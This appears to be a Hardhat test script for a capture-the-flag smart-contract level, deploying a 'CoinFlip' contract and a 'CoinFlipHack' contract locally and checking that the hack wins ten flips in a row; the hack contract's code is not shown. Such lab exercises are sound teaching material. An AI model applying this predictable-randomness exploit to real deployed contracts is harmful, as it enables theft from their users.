import assert from 'assert';

import { ethers } from 'hardhat';

const main = async () => {
  const ContractFactory = await ethers.getContractFactory('CoinFlip');
  const contract = await ContractFactory.deploy();

  const [owner, attacker] = await ethers.getSigners();

  await contract.deployed();
  console.log('Contract deployed to:', contract.address);

  const ContractHack = await ethers.getContractFactory('CoinFlipHack');
  const coinflipHack = await ContractHack.deploy(contract.address);
  await coinflipHack.deployed();

  console.log(`Owner address : ${owner.address}`);
  console.log(`Attacker address ${attacker.address}`);
  console.log(`CoinflipHack address : ${coinflipHack.address}`);

  // 1. flip() 10 times
  for (let i = 1; i <= 10; i++) {
    await coinflipHack.flip(true);
  }

  // 2. Check consecutiveWins
  const consecutiveWins = await contract.consecutiveWins();
  assert(consecutiveWins.toNumber() === 10);
  console.log(`consecutiveWins : ${consecutiveWins}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
